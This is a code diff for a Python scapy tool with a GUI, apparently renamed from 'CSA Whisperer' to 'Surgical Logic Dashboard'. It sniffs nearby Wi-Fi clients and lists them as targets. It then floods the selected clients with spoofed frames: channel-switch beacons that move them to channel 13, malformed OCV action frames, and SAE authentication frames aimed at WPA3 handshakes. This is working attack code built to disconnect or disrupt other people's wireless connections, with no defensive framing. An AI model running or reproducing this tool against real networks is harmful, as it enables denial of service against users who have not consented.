@@ -2,120 +2,79 @@ import os, sys, time, threading
 from scapy.all import *
 import tkinter as tk
 
-class CSAWhispererGUI:
+class SurgicalDashboard:
     def __init__(self, iface):
         self.iface = iface
-        self.discovered = {} # {MAC: {"BSSID": bssid, "RSSI": rssi, "CH": ch}}
-        self.lying_to = set() # Set of currently targeted MACs
+        self.discovered = {}
+        self.targets = set()
         self.running = True
-        self.scanning = True
         
         self.setup_monitor()
         
-        # --- UI Setup ---
         self.root = tk.Tk()
-        self.root.title("CSA Whisperer v2.0 - Stealth Logic")
-        self.root.geometry("850x650")
+        self.root.title("Surgical Logic Dashboard v3.0")
+        self.root.geometry("900x700")
         self.root.configure(bg="#050505")
 
-        title = tk.Label(self.root, text="CHOOSE WHO TO LIE TO", fg="#00FF41", bg="#050505", font=("Courier", 14, "bold"))
-        title.pack(pady=10)
+        # --- Target List ---
+        tk.Label(self.root, text="DISCOVERED TARGETS (MANUAL SELECT)", fg="#00FF41", bg="#050505").pack(pady=5)
+        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="multiple", height=15)
+        self.listbox.pack(padx=10, fill="both", expand=True)
 
-        # Multiple selection listbox
-        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), 
-                                 selectmode="multiple", height=18)
-        self.listbox.pack(padx=10, pady=5, fill="both", expand=True)
+        # --- Command Center ---
+        cmd_frame = tk.Frame(self.root, bg="#050505")
+        cmd_frame.pack(pady=10)
+        
+        tk.Button(cmd_frame, text="CSA WHISPER (STEALTH)", command=lambda: self.execute("CSA"), bg="#0044aa", fg="white", width=20).grid(row=0, column=0, padx=5)
+        tk.Button(cmd_frame, text="OCV VIOLATION", command=lambda: self.execute("OCV"), bg="#aa5500", fg="white", width=20).grid(row=0, column=1, padx=5)
+        tk.Button(cmd_frame, text="SAE RESET (WPA3)", command=lambda: self.execute("SAE"), bg="#880000", fg="white", width=20).grid(row=0, column=2, padx=5)
+        
+        tk.Button(self.root, text="REPAIR WIFI & EXIT", command=self.shutdown, bg="#222", fg="red").pack(pady=10)
 
-        btn_frame = tk.Frame(self.root, bg="#050505")
-        btn_frame.pack(pady=10)
-
-        tk.Button(btn_frame, text="ENGAGE WHISPER", command=self.toggle_lie, bg="#880000", fg="white", width=20).pack(side="left", padx=5)
-        tk.Button(btn_frame, text="STOP ALL", command=self.stop_all, bg="#444", fg="white", width=15).pack(side="left", padx=5)
-        tk.Button(btn_frame, text="REPAIR & EXIT", command=self.shutdown, bg="#222", fg="#ff0000", width=15).pack(side="left", padx=5)
-
-        self.status = tk.Label(self.root, text="Scanner Live...", bg="#050505", fg="#00FF41")
-        self.status.pack()
-
-        # Threads
-        threading.Thread(target=self.hopper, daemon=True).start()
         threading.Thread(target=self.scanner, daemon=True).start()
-        threading.Thread(target=self.whisper_engine, daemon=True).start()
 
     def setup_monitor(self):
-        os.system("sudo airmon-ng check kill")
-        os.system(f"sudo ip link set {self.iface} down")
-        os.system(f"sudo iw dev {self.iface} set type monitor")
-        os.system(f"sudo ip link set {self.iface} up")
-
-    def hopper(self):
-        ch = 1
-        while self.running:
-            if not self.lying_to: # Only hop if not attacking
-                os.system(f"sudo iw dev {self.iface} set channel {ch}")
-                self.current_ch = ch
-                ch = (ch % 13) + 1
-                time.sleep(0.5)
-            else:
-                time.sleep(1)
+        os.system(f"sudo airmon-ng check kill && sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")
 
     def scanner(self):
         def callback(pkt):
-            if pkt.haslayer(Dot11) and self.scanning:
+            if pkt.haslayer(Dot11):
                 dot11 = pkt.getlayer(Dot11)
                 if dot11.addr2 and dot11.addr3 and dot11.addr2 != dot11.addr3:
                     client = dot11.addr2
                     if client not in self.discovered and client != "ff:ff:ff:ff:ff:ff":
-                        self.discovered[client] = {"BSSID": dot11.addr3, "CH": self.current_ch}
-                        self.root.after(0, self.refresh_ui)
+                        self.discovered[client] = {"BSSID": dot11.addr3}
+                        self.listbox.insert(tk.END, f"Target: {client} | AP: {dot11.addr3}")
         sniff(iface=self.iface, prn=callback, store=0)
 
-    def refresh_ui(self):
-        self.listbox.delete(0, tk.END)
-        for mac, info in self.discovered.items():
-            status = " [ACTIVE LIE] " if mac in self.lying_to else " [CLEAN] "
-            self.listbox.insert(tk.END, f"{status} {mac} | AP: {info['BSSID']} | CH: {info['CH']}")
-
-    def toggle_lie(self):
-        selected_indices = self.listbox.curselection()
-        if not selected_indices: return
-        
-        for i in selected_indices:
+    def execute(self, mode):
+        selected = self.listbox.curselection()
+        for i in selected:
             mac = list(self.discovered.keys())[i]
-            if mac in self.lying_to:
-                self.lying_to.remove(mac)
-                print(f"[*] Stopped lying to {mac}")
-            else:
-                # Lock to the channel of the FIRST selected target for the injection
-                target_ch = self.discovered[mac]["CH"]
-                os.system(f"sudo iw dev {self.iface} set channel {target_ch}")
-                self.lying_to.add(mac)
-                print(f"[*] Started lying to {mac} on CH {target_ch}")
+            bssid = self.discovered[mac]["BSSID"]
+            threading.Thread(target=self.attack_logic, args=(mac, bssid, mode), daemon=True).start()
+
+    def attack_logic(self, target, bssid, mode):
+        print(f"[LOGIC] Executing {mode} on {target}")
+        base = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)
         
-        self.refresh_ui()
-
-    def whisper_engine(self):
-        # Ghost Channel 13 is often 'off-limits' or empty in many regions
-        csa_ie = Dot11Elt(ID=37, len=3, info=chr(1) + chr(13) + chr(1))
-        while self.running:
-            for mac in list(self.lying_to):
-                bssid = self.discovered[mac]["BSSID"]
-                # Build spoofed Beacon with the 'Move' command
-                pkt = RadioTap()/Dot11(addr1=mac, addr2=bssid, addr3=bssid)/Dot11Beacon()/csa_ie
-                sendp(pkt, iface=self.iface, verbose=False, count=2)
-            time.sleep(0.1)
-
-    def stop_all(self):
-        self.lying_to.clear()
-        self.refresh_ui()
+        if mode == "CSA":
+            # Stealth Move to Ghost Channel 13
+            pkt = base/Dot11Beacon()/Dot11Elt(ID=37, len=3, info=chr(1)+chr(13)+chr(1))
+        elif mode == "OCV":
+            # Malformed OCV Action Frame
+            pkt = base/Dot11Action(category=10, action=4)/Raw(load=b"\xff\x0a\x01\x01")
+        elif mode == "SAE":
+            # State Machine Reset
+            pkt = base/Dot11Auth(algo=3, seqnum=1, status=0)
+            
+        sendp(pkt, iface=self.iface, count=50, inter=0.05, verbose=False)
 
     def shutdown(self):
         self.running = False
-        os.system(f"sudo ip link set {self.iface} down")
-        os.system(f"sudo iw dev {self.iface} set type managed")
-        os.system(f"sudo ip link set {self.iface} up")
-        os.system("sudo systemctl restart NetworkManager")
+        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
         self.root.destroy()
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2: print("Usage: sudo python3 whisper_gui.py [iface]")
-    else: CSAWhispererGUI(sys.argv[1]).root.mainloop()
+    if len(sys.argv) < 2: print("Usage: sudo python3 dashboard.py [iface]")
+    else: SurgicalDashboard(sys.argv[1]).root.mainloop()
